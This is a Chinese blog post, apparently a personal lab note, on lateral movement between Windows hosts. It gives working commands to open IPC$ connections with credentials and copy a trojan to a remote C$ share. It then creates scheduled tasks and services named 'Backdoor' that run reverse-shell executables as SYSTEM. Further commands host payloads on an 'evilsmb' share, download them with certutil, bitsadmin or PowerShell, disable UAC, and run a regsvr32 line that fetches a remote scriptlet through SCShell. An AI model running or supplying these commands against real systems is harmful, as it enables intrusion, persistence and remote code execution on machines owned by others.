@@ -1,0 +1,967 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>win to win横向 - Hexo</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  <meta name="keywords" content=", 内网学习, 域横向">
+  <meta name="description" content="横向移动中如何文件传输对目标机器的文件进行读取、下载、...">
+  <meta name="author" content="John Doe">
+  <link rel="icon" href="/images/icons/16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/180x180.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/xcode.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/solarized-dark.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: false
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '埋下一个梦，待它破土而出。',
+          typing: true,
+          api: 'https://v2.jinrishici.com/one.json',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: false,
+        type: 'url',
+        image: 'https://pic.izhaoo.com/weapp-code.jpg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: true,
+        path: 'myblog/node_modules/hexo-generator-searchdb/templates/search.xml'
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+        <i class="iconfont iconsearch j-navbar-search"></i>
+      
+    </div>
+    <div class="center">win to win横向</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/galleries/ " class="underline "> 随拍</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/tags/ " class="underline "> 标签</a>
+      </li><li class="menu-item">
+        <a href="/categories/ " class="underline "> 分类</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/blog-pictures/01.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">win to win横向</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>March 02, 2023</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>16752</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h1 id="横向移动中如何文件传输"><a href="#横向移动中如何文件传输" class="headerlink" title="横向移动中如何文件传输"></a>横向移动中如何文件传输</h1><p>对目标机器的文件进行读取、下载、上传</p>
+<h2 id="网络共享"><a href="#网络共享" class="headerlink" title="网络共享"></a>网络共享</h2><p>windows的网络共享功能，可以实现局域网内机器之间的网络共享</p>
+<p>提供相关的认证凭据，就可以实现文件共享</p>
+<p>windows默认的文件共享包括，<font color='red'>C、D、E…..这些磁盘、ADMIN系统目录、IPC（满足进程之间的通信）</font></p>
+<p>查看共享文件</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230117180044802.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230117180044802</span></p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>我们主要用到的就是IPC共享</p>
+<p>建立IPC共享的条件</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">开放<span class="hljs-number">139</span>端口    <span class="hljs-meta">#用于共享文件、打印机</span><br><br>开放<span class="hljs-number">445</span>端口     <span class="hljs-meta">#共享文件、打印机</span><br><br>关闭防火墙    <span class="hljs-meta">#有待证明，下面有讲到</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>建立IPC连接</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\ip地址\<span class="hljs-title class_">IPC</span><span class="hljs-variable">$ </span><span class="hljs-string">&quot;密码&quot;</span> /<span class="hljs-symbol">user:</span><span class="hljs-string">&quot;用户名&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>查看C盘文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\ip地址\C<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+<p>如果对方仅仅只开启了IPC文件共享，那么建立IPC连接是可以成功的，但是无法访问文件</p>
+<p>连接成功之后就可以上传木马，将本机的木马上传到对方的C盘</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">copy C:<span class="hljs-string">\Users\wo\Desktop\hobbyhorse_x64.exe</span> <span class="hljs-string">\\192.168.232.132\C$</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230117183445671.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230117183445671</span></p>
+<p>然后提供创建计划任务或者其他方法来执行文件</p>
+<p>计划任务</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> <span class="hljs-string">&quot;计划名字&quot;</span> <span class="hljs-string">/tr</span> c:\artifact.exe（执行的进程的绝对路径） <span class="hljs-string">/sc</span> once <span class="hljs-string">/st</span> 16<span class="hljs-function">:11</span>（时间） <span class="hljs-string">/s</span> 192.168.10.8 <span class="hljs-string">/RU</span> System<br></code></pre></td></tr></table></figure>
+
+<p>然后就会返回shell</p>
+<h3 id="常用的IPC命令"><a href="#常用的IPC命令" class="headerlink" title="常用的IPC命令"></a>常用的IPC命令</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs stata">查看开启的共享<br><span class="hljs-keyword">net</span> share<br> <br>删除某个共享<br><span class="hljs-keyword">net</span> share c$ /del<br> <br>恢复共享<br><span class="hljs-keyword">net</span> share c$=c:<br> <br>建立共享连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.52.143\c$ 123.com  /user:administrator<br> <br>使用域账号建立共享连接<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\192.168.52.143\c$ 域账户密码  /user:域名\域账户<br> <br>查看本机已建立的共享<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br> <br>查看远程主机的文件<br><span class="hljs-keyword">dir</span> \\192.168.52.143\c$<br><span class="hljs-keyword">dir</span> \\192.168.52.143\c$\xx文件夹<br> <br>复制文件到主机c盘下<br><span class="hljs-keyword">copy</span>  文件名  \\ip\c$<br> <br>删除本机所有已建立的连接 <br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> * /del /y<br> <br>将c盘映射到本地自定义z盘<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: \\ip\c$<br> <br>删除映射的磁盘<br><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> z: /del<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="SMB服务器"><a href="#SMB服务器" class="headerlink" title="SMB服务器"></a>SMB服务器</h2><p>SMB服务</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">SMB服务主要功能是<br>共享   文件、打印机、串行端口、通新   等资源<br></code></pre></td></tr></table></figure>
+
+
+
+<p>在自己的服务器上，搭建SMB服务</p>
+<p>然后将要传输的文件，放到SMB的共享目录，并且指定UNC路径</p>
+<p>需要<font color='red'>开启SMB匿名共享</font></p>
+<p>然后让目标机器远程加载</p>
+<p>利用impacket工具包开启</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/root/</span>share                <span class="hljs-comment">#创建共享目录</span><br>python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support     <span class="hljs-comment">#创建名为evilsmb的匿名共享</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="windows自带工具"><a href="#windows自带工具" class="headerlink" title="windows自带工具"></a>windows自带工具</h2><p>Windows自带的一些工具也是可以进行文件传输的</p>
+<p>都是通过下载服务器上面布置的恶意文件，到本地目录下</p>
+<h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p>是一款Windows管理证书的工具，作为证书服务的一部分安装</p>
+<p><font color='red'>支持从网络中下载文件的功能</font></p>
+<p>思路：在目标机器上面执行certutil命令，进行下载服务器上面预先设置的木马文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">certutil <span class="hljs-literal">-urlcache</span> <span class="hljs-operator">-split</span> <span class="hljs-operator">-f</span> 服务器地址 + 保存的地址目录<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a>BITSAdmin</h3><p>win7以后的系统自带bitsadmin工具</p>
+<p>用于创建、下载、上传作业</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer <span class="hljs-built_in">test</span> 地址 保存目录<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>这个工具就比较熟悉了</p>
+<p>通过创建webclient对象，来实现下载文件</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;地址&#x27;</span>,<span class="hljs-string">&#x27;保存地址&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h1><p>在有目标机管理员凭据的前提下，可以使用计划任务</p>
+<p>首先建立IPC连接</p>
+<p>然后利用IPC连接，来上传木马</p>
+<p>最后创建计划任务，来执行木马</p>
+<p>命令</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U Administrator /</span>p admin123<br></code></pre></td></tr></table></figure>
+
+<p>/U    /P是在没有建立IPC连接的情况下使用的</p>
+<p>/S：指定要连接的系统</p>
+<p>/TN：指定要创建的计划任务的名称</p>
+<p>/SC：指定计划任务执行频率</p>
+<p>/MO：指定计划任务执行周期</p>
+<p>/TR：指定计划任务运行的程序路径</p>
+<p>/RU：指定计划任务运行的用户权限</p>
+<p>/F：如果指定的任务已经存在，则强制创建</p>
+<p>然后可以直接执行计划</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/RUN /</span>S ip地址 <span class="hljs-regexp">/I /</span>TN Backdoor<br></code></pre></td></tr></table></figure>
+
+
+
+<p>也可以通过计划任务来执行主机命令，并且保存结果，然后远程读取</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR :<span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c &#x27;whoami &gt; C:\result.txt&#x27;&quot;</span> <span class="hljs-regexp">/RU System /</span>f<br><br>type \\ip地址\C$\result.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p>删除计划</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Delete /</span>S ip地址 <span class="hljs-regexp">/TN Backdoor /</span>F<br></code></pre></td></tr></table></figure>
+
+
+
+<p>还有一种创建计划任务的方式就是at</p>
+<p><font color='red'>在小于win2012使用，schtasks是在高版本的windows使用的</font></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.3.21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:\add.bat<br></code></pre></td></tr></table></figure>
+
+<p>删除</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">at</span> \\<span class="hljs-number">192.168.3.21</span> <span class="hljs-number">2</span> /delete           #<span class="hljs-number">2</span>是计划任务的id<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="实操失败"><a href="#实操失败" class="headerlink" title="实操失败"></a>实操失败</h2><p>攻击机win10</p>
+<p>目标机win7    win2008</p>
+<p>目标机是域用户</p>
+<p>我在win10上面向win7用schtasks写入计划任务无法成功</p>
+<p>一直显示拒绝访问</p>
+<p>但是IPC可以正常连接，并且正常访问</p>
+<p>用at写入命令就可以正常执行</p>
+<p>解决方法如下</p>
+<h2 id="实操成功"><a href="#实操成功" class="headerlink" title="实操成功"></a>实操成功</h2><p>上面的问题已经解决</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F     <span class="hljs-comment">#未加凭据</span><br><br>schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.130</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR C:\reverse_tcp.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U Administrator /</span>p admin123                <span class="hljs-comment">#加上凭据</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>书上说，建立ipc连接之后，是不需要加凭据的</p>
+<p>但是</p>
+<p>实操是需要加上凭据的，不然一直报错</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202124326341.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230202124326341</span></p>
+<p><strong><font color='red'>主要是，目标机器会开启UAC，此时就无法执行计划任务</font></strong></p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System    #路径下的EnableLUA参数，修改为<span class="hljs-number">0</span>，即关闭UAC<br></code></pre></td></tr></table></figure>
+
+<p>但是</p>
+<p><strong><font color='red'>只要是administrator用户登陆，是否开启UAC，毫无影响</font></strong></p>
+<h2 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h2><p>我们一般的思路都是尝试尽可能的把payload<font color='red'>上传</font>到目标机，但是过程肯定是有些艰难的</p>
+<p>还有一个思路就是远程执行</p>
+<h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\\servername\sharename\directory\filename                其中servername是服务器名、sharename是共享资源的名称、后面就是文件夹和文件<br></code></pre></td></tr></table></figure>
+
+<p>简而言之就是网络上的资源，并不是本地资源</p>
+<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>比较简单，就是利用UNC路径加载远程资源</p>
+<p>自己搭建一个SMB服务器，并且上传payload，SMB需要设置匿名共享</p>
+<p>然后创建计划任务，使用UNC加载远程服务器上的payload</p>
+<p>kali为smb服务端</p>
+<p>kali linux 为msf监听端</p>
+<p>win10为已经攻陷的主机</p>
+<p>win7为另外一台待横向主机</p>
+<p><font color='red'>配置smb服务端</font></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir <span class="hljs-regexp">/root/</span>share                <span class="hljs-comment">#创建共享目录</span><br>python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support     <span class="hljs-comment">#创建名为evilsmb的匿名共享</span><br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202131446915.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230202131446915</span></p>
+<p>记得把木马文件放到 /root/share文件夹</p>
+<p><font color='cornflowerblue'>配置监听</font></p>
+<p>msf开启监听</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202131604093.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230202131604093</span></p>
+<p><font color='orange'>win10操作</font></p>
+<p>创建计划任务</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">schtasks <span class="hljs-regexp">/Create /</span>S <span class="hljs-number">192.168</span>.<span class="hljs-number">232.128</span> <span class="hljs-regexp">/TN Backdoor /</span>SC minute <span class="hljs-regexp">/MO 1 /</span>TR \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.152</span>\evilsmb\hobbyhorse_x64.exe <span class="hljs-regexp">/RU System /</span>F <span class="hljs-regexp">/U liukaifeng01 /</span>P admin                    <br></code></pre></td></tr></table></figure>
+
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202132027206.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230202132027206</span></p>
+<p>之后发现主机上线</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202132101178.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230202132101178</span></p>
+<p>成功</p>
+<h1 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h1><h2 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h2><p>个人觉得和创建计划任务差不多</p>
+<p><font color='red'>建立共享连接，向远程主机上传攻击载荷</font></p>
+<p><font color='cornflowerblue'>利用已经建立的ipc连接，来创建系统服务</font></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">232</span>.<span class="hljs-number">128</span> create <span class="hljs-keyword">Backdoor </span><span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;cmd.exe /k E:\hobbyhorse_x64.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><font color='orange'>启动创建的服务</font></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sc</span> \\<span class="hljs-number">192.168.232.128</span> start Backdoor<br></code></pre></td></tr></table></figure>
+
+<p>命令执行之后，会显示失败</p>
+<p>但是</p>
+<p>没关系，还是执行了服务</p>
+<p><font color='red'>删除服务</font></p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">sc <span class="hljs-string">\\192.168.232.128</span> <span class="hljs-keyword">delete</span> Backdoor<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h2><p>地址</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SpiderLabs/</span>SCShell<br></code></pre></td></tr></table></figure>
+
+
+
+<p>SCShell是一款无文件横向移动工具</p>
+<p>需要知道远程主机的管理员凭据和已知的服务</p>
+<p>原理</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">通过修改远程主机的服务配置<br><br>将已知服务的二进制路径名修改为指定的程序或者攻击载荷，然后重启服务，攻击之后会将修改的路径自动恢复<br></code></pre></td></tr></table></figure>
+
+
+
+<p>格式</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">SCShell.exe <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">domain</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scshell.exe </span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">232</span>.<span class="hljs-number">135</span> defragsvc <span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c echo &#x27; hello&#x27; &gt; c:\windows\temp\hello.txt&quot;</span> administrator admin            <span class="hljs-comment">#测试写入文件</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p><font color='red'>首先用msf生成payload</font></p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202221003882.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230202221003882</span></p>
+<p>记得一定要设置payload为windows的，它默认是python的payload</p>
+<p><font color='cornflowerblue'>然后远程加载</font></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SCShell</span>.exe <span class="hljs-number">192.168.232.135</span> XblAuthManager <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe /c C:\Windows\System32\regsvr32 /s /n /u /i:http://192.168.232.129:8080/AusSXQGs.sct scrobj.dll&quot;</span> hack admin<br></code></pre></td></tr></table></figure>
+
+
+
+<p>成功就会上线</p>
+<p>但是测试失败</p>
+<p><img    class="lazyload" data-original="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202221518477.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20230202221518477</span></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">关闭了UAC还是失败<br></code></pre></td></tr></table></figure>
+
